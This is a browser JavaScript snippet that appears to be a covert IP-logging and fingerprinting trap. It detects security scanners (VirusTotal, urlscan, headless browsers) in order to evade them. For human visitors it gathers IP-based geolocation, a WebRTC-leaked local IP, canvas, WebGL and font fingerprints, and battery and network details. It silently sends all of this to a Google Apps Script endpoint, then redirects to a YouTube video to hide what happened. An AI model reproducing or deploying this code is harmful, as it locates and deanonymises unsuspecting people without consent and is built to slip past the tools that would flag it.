<script>
    const REDIRECT = 'https://www.youtube.com/watch?v=jNQXAC9IVRw';
    const EMAIL_SCRIPT = 'https://script.google.com/macros/s/AKfycbzMN7cU73bmQPT3wyOJQ1Dt4f6AEUebgwydMDKXFmyEbvQ29HrjBJR1lKuVaaxuV70zBA/exec';
    
    let dataSent = false;

    // ðŸŽ¯ **BOT DETECTION & HUMAN VERIFICATION**
    function isLikelyHuman() {
        // Security scanners often have incomplete browser profiles
        const redFlags = [];
        
        // 1. No user agent
        if (!navigator.userAgent || navigator.userAgent.length < 10) redFlags.push('no_user_agent');
        
        // 2. No screen dimensions (headless browsers)
        if (screen.width === 0 || screen.height === 0) redFlags.push('no_screen');
        
        // 3. No language set
        if (!navigator.language) redFlags.push('no_language');
        
        // 4. Common scanner user agents
        const scannerPatterns = [
            'security', 'scan', 'bot', 'crawler', 'spider', 'check',
            'virustotal', 'urlscan', 'hybrid-analysis', 'any.run',
            'headless', 'phantom', 'selenium', 'puppeteer'
        ];
        
        const ua = navigator.userAgent.toLowerCase();
        if (scannerPatterns.some(pattern => ua.includes(pattern))) {
            redFlags.push('scanner_ua');
        }
        
        // 5. JavaScript execution test (bots sometimes have limited JS)
        try {
            // Test complex JavaScript execution
            const test = new Function('return "test"')();
            if (test !== 'test') redFlags.push('js_restricted');
        } catch(e) {
            redFlags.push('js_blocked');
        }
        
        // If 2+ red flags, likely a scanner
        return {
            is_human: redFlags.length < 2,
            red_flags: redFlags,
            confidence: redFlags.length === 0 ? '99%' : 
                       redFlags.length === 1 ? '80%' : '30%'
        };
    }

    // ðŸŽ¯ **COLLECT ACCURATE DATA** (Only for humans)
    async function collectHumanData() {
        const humanCheck = isLikelyHuman();
        
        // Basic data that even scanners might have
        const data = {
            // âœ… **Detection Info**
            detection_timestamp: new Date().toISOString(),
            local_time: new Date().toLocaleString(),
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timezone_offset: new Date().getTimezoneOffset(),
            human_check: humanCheck,
            probable_scanner: humanCheck.is_human ? 'No' : 'Yes (' + humanCheck.red_flags.join(', ') + ')',
            
            // âœ… **Browser Basics**
            user_agent: navigator.userAgent || 'MISSING',
            platform: navigator.platform || 'MISSING',
            language: navigator.language || 'MISSING',
            languages: navigator.languages ? navigator.languages.join(', ') : 'MISSING',
            cookies: navigator.cookieEnabled ? 'Enabled' : 'Disabled',
            do_not_track: navigator.doNotTrack || 'Not set',
            
            // âœ… **Screen**
            screen_resolution: screen.width + 'x' + screen.height,
            screen_avail: screen.availWidth + 'x' + screen.availHeight,
            color_depth: screen.colorDepth + ' bit',
            pixel_ratio: window.devicePixelRatio,
            orientation: screen.orientation ? screen.orientation.type : 'Unknown',
            
            // âœ… **Hardware**
            hardware_concurrency: navigator.hardwareConcurrency || 'Unknown',
            device_memory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'Unknown',
            max_touch_points: navigator.maxTouchPoints || 0,
            
            // âœ… **URL & Referrer**
            url: window.location.href,
            referrer: document.referrer || 'Direct',
            
            // âœ… **Features**
            localStorage: window.localStorage ? 'Supported' : 'Not supported',
            sessionStorage: window.sessionStorage ? 'Supported' : 'Not supported',
            notifications: 'Notification' in window ? 'Supported' : 'Not supported',
            java_enabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
            
            // âœ… **Plugins**
            plugins: Array.from(navigator.plugins).map(p => p.name).join(', ') || 'None',
        };

        // **ONLY collect advanced data if likely human**
        if (humanCheck.is_human) {
            // Get IP and geolocation
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                data.ip = ipData.ip;
                
                // Get accurate geolocation
                const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                const geoData = await geoResponse.json();
                
                data.geolocation = {
                    ip: geoData.ip,
                    city: geoData.city,
                    region: geoData.region,
                    country: geoData.country_name,
                    country_code: geoData.country_code,
                    postal: geoData.postal,
                    latitude: geoData.latitude,
                    longitude: geoData.longitude,
                    timezone: geoData.timezone,
                    utc_offset: geoData.utc_offset,
                    asn: geoData.asn,
                    org: geoData.org,
                    isp: geoData.org,
                    accuracy: 'High'
                };
            } catch(error) {
                data.ip = 'Failed to fetch';
                data.geolocation = { error: 'Geolocation failed' };
            }

            // WebRTC local IP (for humans only)
            try {
                const rtc = new RTCPeerConnection({iceServers: []});
                rtc.createDataChannel('');
                rtc.createOffer()
                    .then(offer => rtc.setLocalDescription(offer))
                    .catch(() => {});
                
                rtc.onicecandidate = (ice) => {
                    if (ice && ice.candidate && ice.candidate.candidate) {
                        const candidate = ice.candidate.candidate;
                        const ipMatch = candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
                        if (ipMatch && ipMatch[1]) {
                            data.local_ip = ipMatch[1];
                            data.network_type = candidate.includes('host') ? 'LAN' : 'Public';
                        }
                    }
                };
                
                setTimeout(() => rtc.close(), 1000);
            } catch(e) {}
            
            // Advanced fingerprints (humans only)
            try {
                // Canvas fingerprint
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillStyle = '#f60';
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillStyle = '#069';
                ctx.fillText('Fingerprint', 2, 15);
                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
                ctx.fillText('Fingerprint', 4, 17);
                data.canvas_fingerprint = canvas.toDataURL().substring(22, 40);
                
                // WebGL info
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    data.webgl = {
                        vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'Restricted',
                        renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Restricted'
                    };
                }
                
                // Font detection
                const fonts = ['Arial', 'Times New Roman', 'Courier New', 'Verdana', 'Georgia'];
                const detectedFonts = [];
                const baseFont = 'monospace';
                ctx.font = '72px ' + baseFont;
                const baseWidth = ctx.measureText('mmmmmmmmmmlli').width;
                
                fonts.forEach(font => {
                    ctx.font = '72px ' + font + ',' + baseFont;
                    if (ctx.measureText('mmmmmmmmmmlli').width !== baseWidth) {
                        detectedFonts.push(font);
                    }
                });
                data.detected_fonts = detectedFonts;
                
            } catch(e) {
                data.canvas_fingerprint = 'Failed: ' + e.message;
            }
            
            // Battery status
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    data.battery = {
                        level: Math.round(battery.level * 100) + '%',
                        charging: battery.charging,
                        charging_time: battery.chargingTime || 'Unknown',
                        discharging_time: battery.dischargingTime || 'Unknown'
                    };
                } catch(e) {}
            }
            
            // Network info
            if (navigator.connection) {
                data.connection = {
                    type: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink + ' Mbps',
                    rtt: navigator.connection.rtt + ' ms'
                };
            }
            
            // Performance
            if (performance.memory) {
                data.performance = {
                    memory_used: Math.round(performance.memory.usedJSHeapSize / 1048576) + ' MB',
                    memory_total: Math.round(performance.memory.totalJSHeapSize / 1048576) + ' MB'
                };
            }
            
            // Generate visitor ID
            const idString = navigator.userAgent + screen.width + screen.height + navigator.language;
            let hash = 0;
            for (let i = 0; i < idString.length; i++) {
                hash = ((hash << 5) - hash) + idString.charCodeAt(i);
                hash |= 0;
            }
            data.visitor_id = 'VIS-' + Math.abs(hash).toString(16).substring(0, 8).toUpperCase();
            
            // Check WebRTC support
            data.webrtc = !!window.RTCPeerConnection;
        }
        
        return data;
    }

    // ðŸš€ **EXECUTE**
    (async function() {
        try {
            const data = await collectHumanData();
            
            if (!dataSent) {
                dataSent = true;
                
                console.log('ðŸŽ¯ Visitor Data:', data.human_check.is_human ? 'HUMAN' : 'SCANNER');
                
                // Send data
                fetch(EMAIL_SCRIPT, {
                    method: 'POST',
                    mode: 'no-cors',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                }).catch(() => {
                    // Backup GET
                    const params = new URLSearchParams();
                    for (let key in data) {
                        if (typeof data[key] === 'object') {
                            params.append(key, JSON.stringify(data[key]));
                        } else {
                            params.append(key, data[key]);
                        }
                    }
                    fetch(EMAIL_SCRIPT + '?' + params.toString());
                });
            }
            
        } catch(error) {
            // Silent
        }
        
        // Redirect
        setTimeout(() => {
            window.location.href = REDIRECT;
        }, 1800);
        
    })();
</script>
